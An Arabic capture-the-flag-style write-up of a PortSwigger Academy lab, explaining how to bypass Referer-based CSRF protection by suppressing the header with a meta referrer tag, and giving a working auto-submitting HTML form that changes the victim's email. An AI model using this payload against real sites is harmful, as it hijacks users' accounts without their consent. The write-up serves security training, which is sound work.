# [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
**`نفس خطوات حل لاب`** [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

ولكن بما أن هذا اللاب يعتمد على ترويسة `Referer` وإذا قمنا بتغييرها يقوم برفض الطلب ولكن إذا قمنا بحذفها يمر الطلب بدون مشاكل لذلك فسنقوم بإضافة جزء فى السكريبت لكي يمنع إرسالها:
`<meta name="referrer" content="never">`
`OR`
`<meta name="referrer" content="no-referrer">`

```html
<form method="POST" action="https://0a6c00af04022188810a11cc008100f8.web-security-academy.net/my-account/change-email"> 
    <input type="hidden" name="email" value="test@test.com"> 
    <meta name="referrer" content="never">
</form> 
<script> 
        document.forms[0].submit(); 
</script>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)
